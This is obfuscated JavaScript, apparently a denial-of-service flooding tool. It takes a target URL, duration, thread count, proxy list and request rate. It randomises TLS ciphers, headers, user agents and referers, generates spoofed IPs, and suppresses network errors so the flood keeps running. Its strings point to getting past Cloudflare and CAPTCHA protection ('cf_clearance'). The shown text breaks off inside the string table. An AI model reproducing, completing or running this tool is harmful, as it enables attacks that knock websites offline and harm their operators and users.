const sigalgs = [_0x2672b1(0x217), _0x2672b1(0x1ad), _0x2672b1(0x2f6), _0x2672b1(0x29f), _0x2672b1(0x1d3), _0x2672b1(0x238), _0x2672b1(0x1d2), _0x2672b1(0x34b), _0x2672b1(0x1d5), 'rsa_pss_pss_sha256', _0x2672b1(0x31d), _0x2672b1(0x30d), _0x2672b1(0x2c8), _0x2672b1(0x225), _0x2672b1(0x1f4), _0x2672b1(0x37d), 'rsa_pkcs1_sha2240', 'rsa_pss_pss_sha512', _0x2672b1(0x355), _0x2672b1(0x23b)];
let concu = sigalgs['join'](':');
controle_header = [_0x2672b1(0x32e), _0x2672b1(0x230), _0x2672b1(0x299), _0x2672b1(0x1d8), _0x2672b1(0x2d3), _0x2672b1(0x250), 'public', _0x2672b1(0x1f3), _0x2672b1(0x247), _0x2672b1(0x2d0)], ignoreNames = ['RequestError', _0x2672b1(0x391), 'CaptchaError', 'CloudflareError', _0x2672b1(0x338), _0x2672b1(0x1b9), _0x2672b1(0x290), _0x2672b1(0x36c), _0x2672b1(0x1b4), _0x2672b1(0x2eb), _0x2672b1(0x1ac)], ignoreCodes = [_0x2672b1(0x388), _0x2672b1(0x274), _0x2672b1(0x390), 'ECONNREFUSED', _0x2672b1(0x266), _0x2672b1(0x33c), _0x2672b1(0x288), _0x2672b1(0x386), 'EPROTO', 'EAI_AGAIN', _0x2672b1(0x219), _0x2672b1(0x28d), _0x2672b1(0x29a), _0x2672b1(0x2b5), _0x2672b1(0x315), _0x2672b1(0x1f8), 'EAI_NODATA', _0x2672b1(0x22b), _0x2672b1(0x357), _0x2672b1(0x244), _0x2672b1(0x1cd), 'EBADF', _0x2672b1(0x2de), 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', _0x2672b1(0x33c), _0x2672b1(0x340), 'EILSEQ', _0x2672b1(0x395), _0x2672b1(0x22a), _0x2672b1(0x2ec), _0x2672b1(0x207), _0x2672b1(0x21c), _0x2672b1(0x233), _0x2672b1(0x2b7), 'EMSGSIZE', _0x2672b1(0x34c), _0x2672b1(0x21b), _0x2672b1(0x393), 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', _0x2672b1(0x1c5), _0x2672b1(0x242), _0x2672b1(0x330), 'ENOTEMPTY', _0x2672b1(0x350), _0x2672b1(0x203), _0x2672b1(0x2bb), _0x2672b1(0x266), _0x2672b1(0x305), _0x2672b1(0x302), _0x2672b1(0x1e2), _0x2672b1(0x206), _0x2672b1(0x3a1), _0x2672b1(0x300), _0x2672b1(0x3a0), _0x2672b1(0x2ea), _0x2672b1(0x251), _0x2672b1(0x2c3), _0x2672b1(0x234), _0x2672b1(0x25b), _0x2672b1(0x2be), 'CERT_NOT_YET_VALID'];
const headerFunc = {
    'accept' () {
        const _0x768d4e = _0x2672b1;
        for (let _0x3c597b = accept_header[_0x768d4e(0x389)] - 0x1; _0x3c597b > 0x0; _0x3c597b--) {
            const _0x1a39cf = Math[_0x768d4e(0x325)](Math[_0x768d4e(0x2fa)]() * (_0x3c597b + 0x1));
            [accept_header[_0x3c597b], accept_header[_0x1a39cf]] = [accept_header[_0x1a39cf], accept_header[_0x3c597b]];
        }
        return accept_header[Math[_0x768d4e(0x325)](Math['random']() * accept_header[_0x768d4e(0x389)])];
    },
    'lang' () {
        const _0x81e6fb = _0x2672b1;
        for (let _0x25ba4a = lang_header['length'] - 0x1; _0x25ba4a > 0x0; _0x25ba4a--) {
            const _0x162f26 = Math[_0x81e6fb(0x325)](Math[_0x81e6fb(0x2fa)]() * (_0x25ba4a + 0x1));
            [lang_header[_0x25ba4a], lang_header[_0x162f26]] = [lang_header[_0x162f26], lang_header[_0x25ba4a]];
        }
        return lang_header[Math[_0x81e6fb(0x325)](Math[_0x81e6fb(0x2fa)]() * lang_header[_0x81e6fb(0x389)])];
    },
    'encoding' () {
        const _0x53dc9e = _0x2672b1;
        for (let _0x262614 = encoding_header[_0x53dc9e(0x389)] - 0x1; _0x262614 > 0x0; _0x262614--) {
            const _0x2d13f1 = Math['floor'](Math[_0x53dc9e(0x2fa)]() * (_0x262614 + 0x1));
            [encoding_header[_0x262614], encoding_header[_0x2d13f1]] = [encoding_header[_0x2d13f1], encoding_header[_0x262614]];
        }
        return encoding_header[Math[_0x53dc9e(0x325)](Math[_0x53dc9e(0x2fa)]() * encoding_header[_0x53dc9e(0x389)])];
    },
    'controling' () {
        const _0x2680ef = _0x2672b1;
        return controle_header[Math['floor'](Math[_0x2680ef(0x2fa)]() * controle_header[_0x2680ef(0x389)])];
    },
    'cipher' () {
        const _0x4c2b90 = _0x2672b1;
        return cplist[Math[_0x4c2b90(0x325)](Math[_0x4c2b90(0x2fa)]() * cplist[_0x4c2b90(0x389)])];
    },
    'referers' () {
        const _0x34087d = _0x2672b1;
        for (let _0x46775c = referer['length'] - 0x1; _0x46775c > 0x0; _0x46775c--) {
            const _0x11e9b8 = Math[_0x34087d(0x325)](Math[_0x34087d(0x2fa)]() * (_0x46775c + 0x1));
            [referer[_0x46775c], referer[_0x11e9b8]] = [referer[_0x11e9b8], referer[_0x46775c]];
        }
        return referer[Math[_0x34087d(0x325)](Math['random']() * referer[_0x34087d(0x389)])];
    },
    'platforms' () {
        const _0x5a6525 = _0x2672b1;
        return platform[Math[_0x5a6525(0x325)](Math['random']() * platform['length'])];
    },
    'mode' () {
        const _0x2aa4c5 = _0x2672b1;
        return fetch_mode[Math[_0x2aa4c5(0x325)](Math['random']() * fetch_mode[_0x2aa4c5(0x389)])];
    },
    'dest' () {
        const _0x2a290d = _0x2672b1;
        return fetch_dest[Math[_0x2a290d(0x325)](Math['random']() * fetch_dest['length'])];
    },
    'site' () {
        const _0x9c2f8b = _0x2672b1;
        return fetch_site[Math['floor'](Math[_0x9c2f8b(0x2fa)]() * fetch_site[_0x9c2f8b(0x389)])];
    },
    'countrys' () {
        const _0xf5a54e = _0x2672b1;
        return country[Math[_0xf5a54e(0x325)](Math[_0xf5a54e(0x2fa)]() * country['length'])];
    },
    'type' () {
        const _0x1c433b = _0x2672b1;
        return type[Math[_0x1c433b(0x325)](Math[_0x1c433b(0x2fa)]() * type['length'])];
    }
};

function spoof() {
    const _0x1ca069 = _0x2672b1;
    return '' + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': '12'
    }) + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': _0x1ca069(0x269)
    }) + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': _0x1ca069(0x269)
    }) + '.' + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': '12'
    }) + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': _0x1ca069(0x269)
    }) + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': _0x1ca069(0x269)
    }) + '.' + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': '12'
    }) + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': _0x1ca069(0x269)
    }) + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': _0x1ca069(0x269)
    }) + '.' + randstr[_0x1ca069(0x1bd)]({
        'length': 0x1,
        'charset': '12'
    }) + randstr['generate']({
        'length': 0x1,
        'charset': _0x1ca069(0x269)
    }) + randstr['generate']({
        'length': 0x1,
        'charset': _0x1ca069(0x269)
    });
}

function randomByte() {
    const _0x3fc78e = _0x2672b1;
    let _0x3c4840 = new Uint8Array(0x1);
    return window[_0x3fc78e(0x392)][_0x3fc78e(0x306)](_0x3c4840), _0x3c4840[0x0];
}

function randomIp() {
    const _0x3d33c3 = _0x2672b1;
    let _0x5e1325 = [];
    for (let _0x345d91 = 0x0; _0x345d91 < 0x4; _0x345d91++) {
        _0x5e1325[_0x3d33c3(0x284)](Math[_0x3d33c3(0x325)](Math[_0x3d33c3(0x2fa)]() * 0x100));
    }
    return _0x5e1325['join']('.');
}
process['on']('uncaughtException', function (_0x416053) {
    const _0x4cb5ae = _0x2672b1;
    if (_0x416053[_0x4cb5ae(0x33b)] && ignoreCodes['includes'](_0x416053[_0x4cb5ae(0x33b)]) || _0x416053[_0x4cb5ae(0x2ac)] && ignoreNames[_0x4cb5ae(0x344)](_0x416053[_0x4cb5ae(0x2ac)])) return !0x1;
})['on'](_0x2672b1(0x2b6), function (_0x2fdab3) {
    const _0x60e002 = _0x2672b1;
    if (_0x2fdab3[_0x60e002(0x33b)] && ignoreCodes[_0x60e002(0x344)](_0x2fdab3['code']) || _0x2fdab3[_0x60e002(0x2ac)] && ignoreNames[_0x60e002(0x344)](_0x2fdab3['name'])) return !0x1;
})['on']('warning', _0x6ce4aa => {
    const _0x3dc2c8 = _0x2672b1;
    if (_0x6ce4aa[_0x3dc2c8(0x33b)] && ignoreCodes[_0x3dc2c8(0x344)](_0x6ce4aa[_0x3dc2c8(0x33b)]) || _0x6ce4aa['name'] && ignoreNames[_0x3dc2c8(0x344)](_0x6ce4aa[_0x3dc2c8(0x2ac)])) return !0x1;
})['setMaxListeners'](0x0);

function isPrivate(_0x190a6f, _0x3fe0c4) {
    const _0x23a074 = _0x2672b1;
    if (!_0x190a6f) throw new Error(_0x23a074(0x334));
    (!_0x3fe0c4 || !Array[_0x23a074(0x1e9)](_0x3fe0c4)) && (_0x3fe0c4 = ['10.0.0.0/8', '172.16.0.0/12', _0x23a074(0x309)]);
    const _0x455de7 = ipaddr[_0x23a074(0x1ef)](_0x190a6f);
    for (let _0x46c5e3 = 0x0; _0x46c5e3 < _0x3fe0c4['length']; _0x46c5e3++) {
        const _0x1a9e8f = ipaddr[_0x23a074(0x29d)](_0x3fe0c4[_0x46c5e3]);
        if (_0x455de7[_0x23a074(0x27b)](_0x1a9e8f)) return !![];
    }
    return ![];
}
const target = process[_0x2672b1(0x356)][0x2],
    time = process[_0x2672b1(0x356)][0x3],
    thread = process[_0x2672b1(0x356)][0x4],
    proxyFile = process['argv'][0x5],
    rps = process[_0x2672b1(0x356)][0x6];
(!target || !time || !thread || !proxyFile || !rps) && (console['log'](_0x2672b1(0x277)[_0x2672b1(0x358)]), process[_0x2672b1(0x2ae)](0x1));
!/^https?:\/\//i [_0x2672b1(0x208)](target) && (console[_0x2672b1(0x23d)](_0x2672b1(0x25d)), process['exit'](0x1));
let proxys = [];

function _0x3ee2() {
    const _0x48e076 = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Opera/5.0 (compatible; Windows NT 6.9; en-us) Gecko/20180224 Chrome/35.1.271.187 Safari/592.28', 'UNKNOWN', 'encoding', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1', 'https://www.dictionary.com', 'ECDHE-ECDSA-AES128-GCM-SHA256', 'dsa_sha512', 'https://www.thedailyshow.com', 'https://www.vuejs.org', 'ii-CN,ii;q=0.8', 'https://www.twitter.com', 'https://www.redcross.org', 'az-Latn-AZ,az;q=0.9', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 's-maxage=86400', 'ka-GE,ka;q=0.9', 'https://www.europa.eu', 'max-age=0', 'lt-LT,lt;q=0.9', '645777DCHIFK', 'ps-AF,ps;q=0.8', 'te-IN,te;q=0.9', 'toUTCString', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'https://www.wikipedia.org', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0', 'ECDHE-RSA-CHACHA20-POLY1305', 'Error proxy file:', 'ECONNABORTED', 'GREASE:X25519:x25519:P-256:P-384:P-521:X448', 'syr-SY,syr;q=0.8', 'close', 'yellow', 'nds-DE,nds;q=0.8', 'https://www.amazon.com', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain', 'hi-IN,hi;q=0.9', 'https://www.mapboxgl-js.com', 'Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61', 'ETXTBSY', 'InvalidURL', 'EINVAL', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json', 'https://www.github.com', 'https://www.apple.com', 'tn-ZA,tn;q=0.8', 'SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'tls', 'bs-Latn-BA,bs;q=0.8', 'cipher', 'https://www.scientificamerican.com', 'ecdsa_brainpoolP384r1tls13_sha384', 'referers', 'https://www.mysql.com', 'end', 'random', 'https://www.nypl.org', 'ml-IN,ml;q=0.9', 'audio/mpeg', 'fr-CH,fr;q=0.8', 'https://www.doctorswithoutborders.org', 'ESRCH', 'SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0', 'ERANGE', 'lang', 'update', 'EPROTONOSUPPORT', 'getRandomValues', 'ka-GE,ka;q=0.8', 'AES256-GCM-SHA384', '192.168.0.0/16', 'Other', 'https://www.savethechildren.org', 'type', 'dsa_sha384', 'https://www.yahoo.com', 'mn-Mong-CN,mn;q=0.8', 'https://www.python.org', 'is-IS,is;q=0.9', 'Linux', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css', 'clear', 'ENOTCONN', 'mr-IN,mr;q=0.9', 'or-IN,or;q=0.9', 'compress, gzip', 'https://www.britannica.com', 'ks-Arab-IN,ks;q=0.8', 'SSL_OP_NO_COMPRESSION', 'Keep-Alive', 'dsa_sha256', 'sl-SI,sl;q=0.9', 'audio/midi', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'readFileSync', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript', 'Apple TV', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', 'floor', 'https://www.theguardian.com', 'https://www.medlineplus.gov', 'CONNECT', 'gl-ES,gl;q=0.9', 'https://www.healthline.com', 'sr-Latn-RS,sr;q=0.9', 'uk-UA,uk;q=0.9', 'video/mpeg', 'no-cache', 'quz-BO,quz;q=0.8', 'ENOTDIR', 'isMaster', 'jv-Latn-ID,jv;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'IP address is required', 'application/graphql', 'is-IS,is;q=0.8', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 'ParseError', 'mode', 'toString', 'code', 'EHOSTUNREACH', 'gzip, deflate, br', 'TLSv1_2_method', 'AES128-SHA256', 'EIDRM', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'he-IL,he;q=0.9', 'SEC-SGHX210/1.0 UP.Link/6.3.1.13.0', 'includes', 'https://www.huffingtonpost.com', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'vi-VN,vi;q=0.9', 'SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)', 'fork', 'https://www.webmd.com', 'ecdsa_sha224', 'ENAMETOOLONG', '1200328kmZWgt', 'Windows Phone', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml', 'ENOTSOCK', 'cluster', 'https://www.icrc.org', 'et-EE,et;q=0.9', 'SonyEricssonT100/R101', 'sm2sig_sm3', 'argv', 'EADDRNOTAVAIL', 'rainbow', 'it-IT,it;q=0.9', 'application/octet-stream', 'zh-CN,zh;q=0.9', 'destroy', 'ru-RU,ru;q=0.9', 'pa-Arab-PK,pa;q=0.8', 'fa-IR,fa;q=0.9', 'zh-TW,zh;q=0.9', 'ky-KG,ky;q=0.9', 'SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'km-KH,km;q=0.8', 'SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'https://www.cancer.gov', 'https://www.oecd.org', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0', 'http', 'ne-IN,ne;q=0.8', 'JSONError', 'host', 'none', 'multipart/form-data', 'https://www.wsj.com', 'https://www.wto.org', 'text/javascript', 'quz-PE,quz;q=0.8', 'SSL_OP_NO_TICKET', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'ug-CN,ug;q=0.8', 'SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'https://www.cnbc.com', 'ur-PK,ur;q=0.9', 'ig-NG,ig;q=0.8', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'smn-FI,smn;q=0.8', 'rsa_pss_pss_sha384', 'cors', 'https://www.fda.gov', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'tg-Cyrl-TJ,tg;q=0.8', 'bg-BG,bg;q=0.9', 'from', 'https://www.bootstrap.com', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'ESOCKETTIMEDOUT', 'pt-BR,pt;q=0.9', 'SELF_SIGNED_CERT_IN_CHAIN', 'length', 'fr-CA,fr;q=0.8', 'Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10', 'https://www.sciencemag.org', 'response', 'https://www.oxfam.org', 'site', 'ERR_ASSERTION', 'StatusCodeError', 'crypto', 'ENOBUFS', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd', 'EINPROGRESS', 'https://www.lesscss.org', '11QMBpQc', 'SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0', 'es-ES,es;q=0.9', 'https://www.wikimedia.org', 'PlayStation 4', 'Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30', 'pa-IN,pa;q=0.9', 'https://www.google.com', 'ca-ES,ca;q=0.9', 'ETIME', 'ESPIPE', 'eu-ES,eu;q=0.9', 'BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102', 'mua-CM,mua;q=0.8', 'https://www.nih.gov', 'hex', 'final', 'ECDHE-RSA-AES128-SHA', 'dest', 'ne-NP,ne;q=0.9', 'http/1.1', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml', 'TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded', 'path', 'application/ld+json', 'kn-IN,kn;q=0.9', 'ProxyError', 'ecdsa_brainpoolP256r1tls13_sha256', 'pt-PT,pt;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript', 'spdy/3.1', 'application/vnd.ms-excel', 'ha-Latn-NG,ha;q=0.8', 'SSL_OP_TLSEXT_PADDING', 'URLError', 'km-KH,km;q=0.9', 'https://www.bloomberg.com', 'ECDHE-ECDSA-AES128-SHA256', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript', 'ParserError', 'video/mp4', 'https://www.stackoverflow.com', 'application/x-x509-server-cert', 'generate', 'ECDHE-ECDSA-AES256-SHA384', 'https://www.highcharts.com', 'https://www.nasa.gov', 'SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384', 'application/x-pkcs7-certificates', 'sr-Cyrl-RS,sr;q=0.9', 'ENOSPC', 'SonyEricssonT68/R201A', 'https://www.instagram.com', '0.1.0', 'https://www.linkedin.com', 'fr-FR,fr;q=0.9', 'bn-BD,bn;q=0.8', 'https://www.bbc.com', 'EALREADY', 'gu-IN,gu;q=0.9', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36', 'SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)', 'same-origin', 'ed448', 'ecdsa_sha1', 'application/vnd.api+json', 'rsa_pkcs1_sha1', 'https://www.unicef.org', 'application/pdf', 'only-if-cached', 'https://www.washingtonpost.com', 'application/x-www-form-urlencoded', 'as-IN,as;q=0.8', 'Roku', 'https://www.amnesty.org', 'https://www.nytimes.com', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css', 'image/png', 'message', 'EROFS', 'ar-SA,ar;q=0.9', 'se-NO,se;q=0.8', 'Amazon Fire TV', 'net', 'createCipheriv', 'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)', 'isArray', 'Smart TV', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript', 'ECDHE-RSA-AES256-GCM-SHA384', 'https://www.msn.com', 'https://www.cdc.gov', 'parse', 'fake-useragent', 'application/vnd.ms-powerpoint', 'https://www.worldbank.org', 'private', 'dsa_sha1', 'Nintendo Switch', 'https://www.imf.org', 'SSL_OP_ALL', 'ENOTFOUND', 'https://www.quora.com', 'aes-256-cbc', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', '7096220EefgYC', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'lb-LU,lb;q=0.8', 'Xbox One', 'same-site', 'https://www.php.net', 'sms-FI,sms;q=0.8', 'EOPNOTSUPP', 'portalmmm/2.0 N410i(c20;TB) ', 'setKeepAlive', 'ESHUTDOWN', 'EIO', 'test', 'SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]', 'mt-MT,mt;q=0.8', 'log', 'https://www.nationalgeographic.com', 'nl-NL,nl;q=0.9', '@tcpspoofed', 'https', 'AES256-SHA', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40', 'cf_clearance=', 'SSLcom', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json', 'connect', 'ECDHE-RSA-AES256-SHA', 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512', 'ga-IE,ga;q=0.9', 'EHOSTDOWN', 'pl-PL,pl;q=0.9', 'ENETDOWN', 'EISCONN', 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA', 'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8', 'my-MM,my;q=0.9', 'gsw-CH,gsw;q=0.8', 'randomBytes', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'https://www.angularjs.org', 'https://www.cnn.com', 'dsa_sha224', '\x1b[36mInstalling\x1b[37m the requirements', 'https://www.materializecss.com', 'ECDHE-RSA-AES128-GCM-SHA256', 'mr-MN,mr;q=0.8', 'EINTR', 'EAI_NONAME', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'application/x-x509-ca-cert', 'SSL_OP_NO_SSLv3', 'https://www.openstreetmap.org', 'no-store', 'application/x-bzip', 'application/x-pkcs12', 'EMFILE', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'utf-8', '*/*', 'https://www.merriam-webster.com', 'ed25519', 'lo-LA,lo;q=0.9', 'href', 'ecdsa_secp521r1_sha512', 'unknown', 'error', 'video/avi', 'ro-RO,ro;q=0.9', 'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8', 'application/x-shockwave-flash', 'ENOSYS', 'http2', 'EAFNOSUPPORT', 'https://www.greenpeace.org', 'en-GB,en;q=0.9', 'proxy-revalidate', '3zSnKmR', 'application/x-7z-compressed', 'SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'jar', 'mt-MT,mt;q=0.9', 'ln-CG,ln;q=0.8', 'https://www.mapbox.com', 'https://www.mayoclinic.org', 'must-revalidate', 'EXDEV', 'rw-RW,rw;q=0.8', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'audio/wav', 'video/quicktime', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'https://www.nato.int', 'constants', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36', 'SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'sent with http:// or https://', 'hr-HR,hr;q=0.9', 'split', 'application/zip', 'https://www.d3js.org', 'application/xml', 'https://www.nature.com', 'Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10', 